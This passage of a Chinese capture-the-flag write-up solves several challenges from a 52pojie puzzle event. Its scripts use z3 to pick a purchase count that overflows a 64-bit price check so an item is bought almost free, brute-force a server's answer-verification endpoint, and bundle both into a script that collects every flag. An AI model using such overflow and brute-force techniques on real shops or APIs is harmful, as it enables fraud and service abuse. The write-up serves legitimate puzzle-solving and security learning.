96);">'POST'</span>, headers: {<span style="color: rgb(168, 255, 96);">'Content-Type'</span>: <span style="color: rgb(168, 255, 96);">'application/x-www-form-urlencoded'</span>}, body: <span style="color: rgb(168, 255, 96);">`item_id=<span style="color: rgb(218, 239, 163);">${encodeURIComponent(item)}</span>`</span>});<br />        <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(result + <span style="color: rgb(168, 255, 96);">':'</span>, <span style="color: rgb(150, 203, 254);">await</span> resp.<span style="color: rgb(255, 255, 182);">json</span>());<br />    }<br />    <span style="color: rgb(124, 124, 124);">/* calc way:<br />from z3 import *<br />v = BitVec('a', 64)<br />s=Solver()<br />s.add(v&gt;0)<br />s.add(10000*v&lt;20)<br />s.add(10000*v&gt;0)<br />s.check()<br />print(s.model())<br />    */</span><br />    <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">buyItem</span>(<span style="color: rgb(168, 255, 96);">'4'</span>, <span style="color: rgb(168, 255, 96);">'182622766329724561'</span>, <span style="color: rgb(168, 255, 96);">'8'</span>);<br />    <span style="color: rgb(124, 124, 124);">/* calc way:<br />from z3 import *<br />v = BitVec('a', 64)<br />s=Solver()<br />s.add(v&gt;0)<br />s.add(999063388*v&lt;10)<br />s.add(999063388*v&gt;0)<br />s.check()<br />print(s.model())<br />    */</span><br />    <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">buyItem</span>(<span style="color: rgb(168, 255, 96);">'5'</span>, <span style="color: rgb(168, 255, 96);">'3952873735356057550'</span>, <span style="color: rgb(168, 255, 96);">'B'</span>);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">main</span>(<span style="color: rgb(255, 115, 253);">691872</span>);</code></pre><h3>flag11</h3><p>css 里要求填入两个数字，且搜索空间很小。</p><p>注意到算出来的每个贴图的x/y坐标不一定是整数，但两个图片的坐标之差应当是30的倍数；可基于这点搜索可行解。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">isok</span>(t):<br />    u = <span style="color: rgb(255, 115, 253);">30</span><br />    t = t % u<br />    <span style="color: rgb(150, 203, 254);">return</span> min(t, u-t) &lt; <span style="color: rgb(255, 115, 253);">0.001</span><br /><br /><span style="color: rgb(150, 203, 254);">for</span> i <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">100</span>):<br />    <span style="color: rgb(150, 203, 254);">for</span> j <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">100</span>):<br />        x1 = <span style="color: rgb(255, 115, 253);">942.5135817416999</span> + <span style="color: rgb(255, 115, 253);">1.0215884355337748</span> * i + <span style="color: rgb(255, 115, 253);">0.24768196677010001</span> * j<br />        y1 = <span style="color: rgb(255, 115, 253);">224.16483995058888</span> + <span style="color: rgb(255, 115, 253);">2.9293942195858147</span> * i + <span style="color: rgb(255, 115, 253);">0.8924085229409133</span> * j<br />        x2 = <span style="color: rgb(255, 115, 253);">68.82766156747003</span> + <span style="color: rgb(255, 115, 253);">7.845383167787458</span> * i + <span style="color: rgb(255, 115, 253);">3.2075066759810236</span> * j<br />        y2 = <span style="color: rgb(255, 115, 253);">427.5662592752474</span> + <span style="color: rgb(255, 115, 253);">0.6121410139677127</span> * i + <span style="color: rgb(255, 115, 253);">1.9485864366522536</span> * j<br />        dx = x2 - x1<br />        dy = y2 - y1<br />        <span style="color: rgb(150, 203, 254);">if</span> isok(dx) <span style="color: rgb(150, 203, 254);">and</span> isok(dy):<br />            print(i,j)</code></pre><p>只得到 71/20 这一个解，填入 html 并用浏览器打开后可在图片上看到 flag11{HPQfVF}。</p><p>(似乎很多人手完即可QAQ)</p><h3>flag12</h3><p>阅读js代码知：输入secret传入wasm，基于wasm的返回可显示flag12。</p><p>wasm 很小，可用 wabt 转成 c 代码阅读。将看到的约束条件丢 z3 可知输入应为 4005161829。</p><p>输入该值后，网页显示 flag12{HOXI}。</p><h3>flagC</h3><p>阅读js代码知：可跳过模型部分，改为直接与服务器交互。</p><p>根据提示确定正确的数量是4，而给的例子中已有4中不同种类的提示“种类正确”的物品。</p><p>猜测所有正确位置均可以是示例中的某个物品的位置，因此编写代码逐个爆破，发现可以得到解。</p><p>代码如下：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">test</span>(inp) {<br />    <span style="color: rgb(150, 203, 254);">let</span> res = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/flagC/verify"</span>, {<br />        <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"content-type"</span>: <span style="color: rgb(168, 255, 96);">"application/json"</span><br />        },<br />        <span style="color: rgb(168, 255, 96);">"referrer"</span>: <span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/flagC/index.html"</span>,<br />        <span style="color: rgb(168, 255, 96);">"body"</span>: <span style="color: rgb(255, 255, 182);">JSON</span>.<span style="color: rgb(255, 255, 182);">stringify</span>(inp),<br />        <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"POST"</span>,<br />    });<br />    <span style="color: rgb(150, 203, 254);">let</span> ret = <span style="color: rgb(150, 203, 254);">await</span> res.<span style="color: rgb(255, 255, 182);">json</span>();<br />    <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(ret);<br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><span style="color: rgb(255, 255, 182);">test</span>({<span style="color: rgb(168, 255, 96);">"boxes"</span>:[<span style="color: rgb(255, 115, 253);">0.0071830302476882935</span>,<span style="color: rgb(255, 115, 253);">0.5186262726783752</span>,<span style="color: rgb(255, 115, 253);">0.4009798765182495</span>,<span style="color: rgb(255, 115, 253);">0.6479262709617615</span>,<span style="color: rgb(255, 115, 253);">0.04319196939468384</span>,<span style="color: rgb(255, 115, 253);">0.0257604718208313</span>,<span style="color: rgb(255, 115, 253);">0.2734942138195038</span>,<span style="color: rgb(255, 115, 253);">0.4855906367301941</span>,<span style="color: rgb(255, 115, 253);">0.7787966132164001</span>,<span style="color: rgb(255, 115, 253);">0.2953517735004425</span>,<span style="color: rgb(255, 115, 253);">0.9544114470481873</span>,<span style="color: rgb(255, 115, 253);">0.45228806138038635</span>,<span style="color: rgb(255, 115, 253);">0.40771162509918213</span>,<span style="color: rgb(255, 115, 253);">0.5121312737464905</span>,<span style="color: rgb(255, 115, 253);">0.7820707559585571</span>,<span style="color: rgb(255, 115, 253);">0.7769460082054138</span>],<span style="color: rgb(168, 255, 96);">"scores"</span>:[<span style="color: rgb(255, 115, 253);">0.8548367619514465</span>,<span style="color: rgb(255, 115, 253);">0.7646901607513428</span>,<span style="color: rgb(255, 115, 253);">0.6844016909599304</span>,<span style="color: rgb(255, 115, 253);">0.42119961977005005</span>],<span style="color: rgb(168, 255, 96);">"classes"</span>:[<span style="color: rgb(255, 115, 253);">3</span>,<span style="color: rgb(255, 115, 253);">1</span>,<span style="color: rgb(255, 115, 253);">8</span>,<span style="color: rgb(255, 115, 253);">4</span>]}).<span style="color: rgb(255, 255, 182);">then</span>(v =&gt; <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(v.hint.<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">' '</span>)[<span style="color: rgb(255, 115, 253);">0</span>])); <span style="color: rgb(124, 124, 124);">// bingo answer</span><br /><span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">split</span>(v) {<br />    <span style="color: rgb(150, 203, 254);">let</span> {boxes, scores, classes} = v;<br />    <span style="color: rgb(150, 203, 254);">let</span> ret = [];<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; scores.length; i++) {<br />        ret.<span style="color: rgb(255, 255, 182);">push</span>({<br />            box: boxes.<span style="color: rgb(255, 255, 182);">slice</span>(i * <span style="color: rgb(255, 115, 253);">4</span>, i * <span style="color: rgb(255, 115, 253);">4</span> + <span style="color: rgb(255, 115, 253);">4</span>),<br />            score: scores[i],<br />            class: classes[i],<br />        });<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">glue</span>(v) {<br />    <span style="color: rgb(150, 203, 254);">let</span> boxes = [], scores = [], classes = [];<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; v.length; i++) {<br />        <span style="color: rgb(150, 203, 254);">let</span> {box, score, class: cls} = v[i];<br />        boxes.<span style="color: rgb(255, 255, 182);">push</span>(...box);<br />        scores.<span style="color: rgb(255, 255, 182);">push</span>(score);<br />        classes.<span style="color: rgb(255, 255, 182);">push</span>(cls);<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> {boxes, scores, classes};<br />}<br /><span style="color: rgb(150, 203, 254);">let</span> x = <span style="color: rgb(255, 255, 182);">split</span>({<span style="color: rgb(168, 255, 96);">"boxes"</span>:[<span style="color: rgb(255, 115, 253);">0.0071830302476882935</span>,<span style="color: rgb(255, 115, 253);">0.5186262726783752</span>,<span style="color: rgb(255, 115, 253);">0.4009798765182495</span>,<span style="color: rgb(255, 115, 253);">0.6479262709617615</span>,<span style="color: rgb(255, 115, 253);">0.40771162509918213</span>,<span style="color: rgb(255, 115, 253);">0.5121312737464905</span>,<span style="color: rgb(255, 115, 253);">0.7820707559585571</span>,<span style="color: rgb(255, 115, 253);">0.7769460082054138</span>,<span style="color: rgb(255, 115, 253);">0.3125038146972656</span>,<span style="color: rgb(255, 115, 253);">0.22943750023841858</span>,<span style="color: rgb(255, 115, 253);">0.728165864944458</span>,<span style="color: rgb(255, 115, 253);">0.46270015835762024</span>,<span style="color: rgb(255, 115, 253);">0.002122640609741211</span>,<span style="color: rgb(255, 115, 253);">0.8341933488845825</span>,<span style="color: rgb(255, 115, 253);">0.3802390992641449</span>,<span style="color: rgb(255, 115, 253);">0.9994925260543823</span>,<span style="color: rgb(255, 115, 253);">0.8375666737556458</span>,<span style="color: rgb(255, 115, 253);">0.6610859632492065</span>,<span style="color: rgb(255, 115, 253);">0.9833332896232605</span>,<span style="color: rgb(255, 115, 253);">0.9978412389755249</span>,<span style="color: rgb(255, 115, 253);">0.46407967805862427</span>,<span style="color: rgb(255, 115, 253);">0.7901232838630676</span>,<span style="color: rgb(255, 115, 253);">0.7629221081733704</span>,<span style="color: rgb(255, 115, 253);">0.9946883320808411</span>,<span style="color: rgb(255, 115, 253);">0.5860870480537415</span>,<span style="color: rgb(255, 115, 253);">0.015289496630430222</span>,<span style="color: rgb(255, 115, 253);">0.6056223511695862</span>,<span style="color: rgb(255, 115, 253);">0.05522865429520607</span>,<span style="color: rgb(255, 115, 253);">0.49284374713897705</span>,<span style="color: rgb(255, 115, 253);">0.019939623773097992</span>,<span style="color: rgb(255, 115, 253);">0.5142461061477661</span>,<span style="color: rgb(255, 115, 253);">0.06407386064529419</span>,<span style="color: rgb(255, 115, 253);">0.7947754263877869</span>,<span style="color: rgb(255, 115, 253);">0.4549929201602936</span>,<span style="color: rgb(255, 115, 253);">0.9924988150596619</span>,<span style="color: rgb(255, 115, 253);">0.638464093208313</span>,<span style="color: rgb(255, 115, 253);">0.7654308676719666</span>,<span style="color: rgb(255, 115, 253);">0.03613254427909851</span>,<span style="color: rgb(255, 115, 253);">0.9887222647666931</span>,<span style="color: rgb(255, 115, 253);">0.2596513032913208</span>,<span style="color: rgb(255, 115, 253);">0.04319196939468384</span>,<span style="color: rgb(255, 115, 253);">0.0257604718208313</span>,<span style="color: rgb(255, 115, 253);">0.2734942138195038</span>,<span style="color: rgb(255, 115, 253);">0.4855906367301941</span>,<span style="color: rgb(255, 115, 253);">0.7787966132164001</span>,<span style="color: rgb(255, 115, 253);">0.2953517735004425</span>,<span style="color: rgb(255, 115, 253);">0.9544114470481873</span>,<span style="color: rgb(255, 115, 253);">0.45228806138038635</span>,<span style="color: rgb(255, 115, 253);">0.41201093792915344</span>,<span style="color: rgb(255, 115, 253);">0.03150711581110954</span>,<span style="color: rgb(255, 115, 253);">0.42948994040489197</span>,<span style="color: rgb(255, 115, 253);">0.07240761816501617</span>,<span style="color: rgb(255, 115, 253);">0.01391458511352539</span>,<span style="color: rgb(255, 115, 253);">0.6711101531982422</span>,<span style="color: rgb(255, 115, 253);">0.41128668189048767</span>,<span style="color: rgb(255, 115, 253);">0.8037518262863159</span>],<span style="color: rgb(168, 255, 96);">"scores"</span>:[<span style="color: rgb(255, 115, 253);">0.8933815360069275</span>,<span style="color: rgb(255, 115, 253);">0.8905048966407776</span>,<span style="color: rgb(255, 115, 253);">0.884631872177124</span>,<span style="color: rgb(255, 115, 253);">0.8726911544799805</span>,<span style="color: rgb(255, 115, 253);">0.8570783138275146</span>,<span style="color: rgb(255, 115, 253);">0.8548367619514465</span>,<span style="color: rgb(255, 115, 253);">0.8514702916145325</span>,<span style="color: rgb(255, 115, 253);">0.8206561803817749</span>,<span style="color: rgb(255, 115, 253);">0.8038726449012756</span>,<span style="color: rgb(255, 115, 253);">0.7646901607513428</span>,<span style="color: rgb(255, 115, 253);">0.7232488393783569</span>,<span style="color: rgb(255, 115, 253);">0.6844016909599304</span>,<span style="color: rgb(255, 115, 253);">0.6817193031311035</span>,<span style="color: rgb(255, 115, 253);">0.42119961977005005</span>],<span style="color: rgb(168, 255, 96);">"classes"</span>:[<span style="color: rgb(255, 115, 253);">2</span>,<span style="color: rgb(255, 115, 253);">5</span>,<span style="color: rgb(255, 115, 253);">7</span>,<span style="color: rgb(255, 115, 253);">6</span>,<span style="color: rgb(255, 115, 253);">10</span>,<span style="color: rgb(255, 115, 253);">3</span>,<span style="color: rgb(255, 115, 253);">9</span>,<span style="color: rgb(255, 115, 253);">9</span>,<span style="color: rgb(255, 115, 253);">15</span>,<span style="color: rgb(255, 115, 253);">1</span>,<span style="color: rgb(255, 115, 253);">0</span>,<span style="color: rgb(255, 115, 253);">8</span>,<span style="color: rgb(255, 115, 253);">9</span>,<span style="color: rgb(255, 115, 253);">4</span>]});<br /><span style="color: rgb(150, 203, 254);">let</span> y = [x[<span style="color: rgb(255, 115, 253);">5</span>],x[<span style="color: rgb(255, 115, 253);">9</span>],x[<span style="color: rgb(255, 115, 253);">11</span>],x[<span style="color: rgb(255, 115, 253);">13</span>]].<span style="color: rgb(255, 255, 182);">map</span>(v =&gt; <span style="color: rgb(255, 255, 182);">JSON</span>.<span style="color: rgb(255, 255, 182);">parse</span>(<span style="color: rgb(255, 255, 182);">JSON</span>.<span style="color: rgb(255, 255, 182);">stringify</span>(v)));<br /><span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> i <span style="color: rgb(150, 203, 254);">of</span> x) {<br />    y[<span style="color: rgb(255, 115, 253);">0</span>].box = i.box;<br />    <span style="color: rgb(150, 203, 254);">if</span> ((<span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">test</span>(<span style="color: rgb(255, 255, 182);">glue</span>(y))).labels[<span style="color: rgb(255, 115, 253);">0</span>] === <span style="color: rgb(168, 255, 96);">"motorcycle 种类正确 位置正确"</span>) {<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />}<br /><span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> i <span style="color: rgb(150, 203, 254);">of</span> x) {<br />    y[<span style="color: rgb(255, 115, 253);">1</span>].box = i.box;<br />    <span style="color: rgb(150, 203, 254);">if</span> ((<span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">test</span>(<span style="color: rgb(255, 255, 182);">glue</span>(y))).labels[<span style="color: rgb(255, 115, 253);">1</span>] === <span style="color: rgb(168, 255, 96);">"bicycle 种类正确 位置正确"</span>) {<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />}<br /><span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> i <span style="color: rgb(150, 203, 254);">of</span> x) {<br />    y[<span style="color: rgb(255, 115, 253);">3</span>].box = i.box;<br />    <span style="color: rgb(150, 203, 254);">if</span> ((<span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">test</span>(<span style="color: rgb(255, 255, 182);">glue</span>(y))).labels[<span style="color: rgb(255, 115, 253);">3</span>] === <span style="color: rgb(168, 255, 96);">"airplane 种类正确 位置正确"</span>) {<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />}<br /><span style="color: rgb(124, 124, 124);">// 正确数量 4</span><br /><span style="color: rgb(124, 124, 124);">/*<br />0: "car 种类错误"<br />1: "bus 种类错误"<br />2: "truck 种类错误"<br />3: "train 种类错误"<br />4: "fire hydrant 种类错误"<br />5: "motorcycle 种类正确 位置错误"<br />6: "traffic light 种类错误"<br />7: "traffic light 种类错误"<br />8: "cat 种类错误"<br />9: "bicycle 种类正确 位置错误"<br />10: "person 种类错误"<br />11: "boat 种类正确 位置正确"<br />12: "traffic light 种类错误"<br />13: "airplane 种类正确 位置错误"<br />*/</span></code></pre><h3>flags all</h3><p>一次性获得所有 flag 的脚本</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">const</span> { runAI } = require(<span style="color: rgb(168, 255, 96);">'./2048ai'</span>);<br /><br /><span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">main</span>(uid_value) {<br />    <span style="color: rgb(150, 203, 254);">let</span> resp = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/auth/login"</span>, {<br />        <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"content-type"</span>: <span style="color: rgb(168, 255, 96);">"application/x-www-form-urlencoded"</span><br />        },<br />        <span style="color: rgb(168, 255, 96);">"body"</span>: <span style="color: rgb(168, 255, 96);">"uid="</span> + uid_value,<br />        <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"POST"</span>,<br />        <span style="color: rgb(168, 255, 96);">"redirect"</span>: <span style="color: rgb(168, 255, 96);">"manual"</span>,<br />    });<br />    <span style="color: rgb(150, 203, 254);">let</span> uid = resp.headers.<span style="color: rgb(255, 255, 182);">getSetCookie</span>().<span style="color: rgb(255, 255, 182);">filter</span>(v =&gt; v.<span style="color: rgb(255, 255, 182);">startsWith</span>(<span style="color: rgb(168, 255, 96);">'uid='</span>))[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">';'</span>)[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">slice</span>(<span style="color: rgb(255, 115, 253);">4</span>);<br />    <span style="color: rgb(124, 124, 124);">// flagA</span><br />    <span style="color: rgb(150, 203, 254);">let</span> flagA = resp.headers.<span style="color: rgb(255, 255, 182);">getSetCookie</span>().<span style="color: rgb(255, 255, 182);">filter</span>(v =&gt; v.<span style="color: rgb(255, 255, 182);">startsWith</span>(<span style="color: rgb(168, 255, 96);">'flagA='</span>))[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">';'</span>)[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">slice</span>(<span style="color: rgb(255, 115, 253);">6</span>);<br />    <span style="color: rgb(150, 203, 254);">let</span> resp2 = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/auth/uid"</span>, {<br />        <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"GET"</span>,<br />        <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"cookie"</span>: <span style="color: rgb(168, 255, 96);">`uid=<span style="color: rgb(218, 239, 163);">${flagA}</span>`</span><br />        }<br />    });<br />    <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'A:'</span>, <span style="color: rgb(150, 203, 254);">await</span> resp2.<span style="color: rgb(255, 255, 182);">text</span>(), <span style="color: rgb(168, 255, 96);">'flag1{52pj2024} flag2{xHOpRP} flag3{GRsgk2} flag4{YvJZNS}'</span>);<br />    <span style="color: rgb(124, 124, 124);">// flagB</span><br />    <span style="color: rgb(150, 203, 254);">const</span> session = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">runAI</span>(uid, money =&gt; money &gt;= <span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(198, 197, 254);">false</span>);<br />    <span style="color: rgb(124, 124, 124);">/* calc way:<br />from z3 import *<br />v = BitVec('a', 64)<br />s=Solver()<br />s.add(v&gt;0)<br />s.add(999063388*v&lt;10)<br />s.add(999063388*v&gt;0)<br />s.check()<br />print(s.model())<br />    */</span><br />    <span style="color: rgb(150, 203, 254);">let</span> cnt = <span style="color: rgb(168, 255, 96);">'3952873735356057550'</span>;<br />    resp = <span style="color: rgb(150, 203, 254);">await</span> session.<span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">'/flagB/buy_item'</span>, {method: <span style="color: rgb(168, 255, 96);">'POST'</span>, headers: {<span style="color: rgb(168, 255, 96);">'Content-Type'</span>: <span style="color: rgb(168, 255, 96);">'application/x-www-form-urlencoded'</span>}, body: <span style="color: rgb(168, 255, 96);">`shop_item_id=<span style="color: rgb(218, 239, 163);">${encodeURIComponent(<span style="color: rgb(255, 115, 253);">5</span>)}</span>&amp;buy_count=<span style="color: rgb(218, 239, 163);">${encodeURIComponent(cnt)}</span>`</span>});<br />    <span style="color: rgb(150, 203, 254);">await</span> resp.<span style="color: rgb(255, 255, 182);">text</span>();<br />    resp = <span style="color: rgb(150, 203, 254);">await</span> session.<span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">'/flagB/use_item'</span>, {method: <span style="color: rgb(168, 255, 96);">'POST'</span>, headers: {<span style="color: rgb(168, 255, 96);">'Content-Type'</span>: <span style="color: rgb(168, 255, 96);">'application/x-www-form-urlencoded'</span>}, body: <span style="color: rgb(168, 255, 96);">`item_id=<span style="color: rgb(218, 239, 163);">${encodeURIComponent(<span style="color: rgb(255, 115, 253);">5</span>)}</span>`</span>});<br />    <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'B:'</span>, (<span style="color: rgb(150, 203, 254);">await</span> resp.<span style="color: rgb(255, 255, 182);">json</span>()).data.<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">' '</span>)[<span style="color: rgb(255, 115, 253);">0</span>], <span style="color: rgb(168, 255, 96);">'flag5{P3prqF} flag6{20240217} flag7{Djl9NQ} flag8{OaOjIK}'</span>);<br /><br />    <span style="color: rgb(124, 124, 124);">// flagC</span><br />    <span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">test</span>(inp) {<br />        <span style="color: rgb(150, 203, 254);">let</span> res = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/flagC/verify"</span>, {<br />            <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />                <span style="color: rgb(168, 255, 96);">"content-type"</span>: <span style="color: rgb(168, 255, 96);">"application/json"</span>,<br />                <span style="color: rgb(168, 255, 96);">"cookie"</span>: <span style="color: rgb(168, 255, 96);">`uid=<span style="color: rgb(218, 239, 163);">${uid}</span>`</span><br />            },<br />            <span style="color: rgb(168, 255, 96);">"referrer"</span>: <span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/flagC/index.html"</span>,<br />            <span style="color: rgb(168, 255, 96);">"body"</span>: <span style="color: rgb(255, 255, 182);">JSON</span>.<span style="color: rgb(255, 255, 182);">stringify</span>(inp),<br />            <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"POST"</span>,<br />        });<br />        <span style="color: rgb(150, 203, 254);">let</span> ret = <span style="color: rgb(150, 203, 254);">await</span> res.<span style="color: rgb(255, 255, 182);">json</span>();<br />        <span style="color: rgb(150, 203, 254);">return</span> ret;<br />    }<br />    <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">test</span>({<span style="color: rgb(168, 255, 96);">"boxes"</span>:[<span style="color: rgb(255, 115, 253);">0.0071830302476882935</span>,<span style="color: rgb(255, 115, 253);">0.5186262726783752</span>,<span style="color: rgb(255, 115, 253);">0.4009798765182495</span>,<span style="color: rgb(255, 115, 253);">0.6479262709617615</span>,<span style="color: rgb(255, 115, 253);">0.04319196939468384</span>,<span style="color: rgb(255, 115, 253);">0.0257604718208313</span>,<span style="color: rgb(255, 115, 253);">0.2734942138195038</span>,<span style="color: rgb(255, 115, 253);">0.4855906367301941</span>,<span style="color: rgb(255, 115, 253);">0.7787966132164001</span>,<span style="color: rgb(255, 115, 253);">0.2953517735004425</span>,<span style="color: rgb(255, 115, 253);">0.9544114470481873</span>,<span style="color: rgb(255, 115, 253);">0.45228806138038635</span>,<span style="color: rgb(255, 115, 253);">0.40771162509918213</span>,<span style="color: rgb(255, 115, 253);">0.5121312737464905</span>,<span style="color: rgb(255, 115, 253);">0.7820707559585571</span>,<span style="color: rgb(255, 115, 253);">0.7769460082054138</span>],<span style="color: rgb(168, 255, 96);">"scores"</span>:[<span style="color: rgb(255, 115, 253);">0.8548367619514465</span>,<span style="color: rgb(255, 115, 253);">0.7646901607513428</span>,<span style="color: rgb(255, 115, 253);">0.6844016909599304</span>,<span style="color: rgb(255, 115, 253);">0.42119961977005005</span>],<span style="color: rgb(168, 255, 96);">"classes"</span>:[<span style="color: rgb(255, 115, 253);">3</span>,<span style="color: rgb(255, 115, 253);">1</span>,<span style="color: rgb(255, 115, 253);">8</span>,<span style="color: rgb(255, 115, 253);">4</span>]}).<span style="color: rgb(255, 255, 182);">then</span>(v =&gt; <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'C:'</span>, v.hint.<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">' '</span>)[<span style="color: rgb(255, 115, 253);">0</span>], <span style="color: rgb(168, 255, 96);">'flag9{KHTALK} flag10{6BxMkW} flag11{HPQfVF} flag12{HOXI}'</span>));<br />}<br /><br /><span style="color: rgb(255, 255, 182);">main</span>(<span style="color: rgb(255, 115, 253);">691872</span>);</code></pre><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; 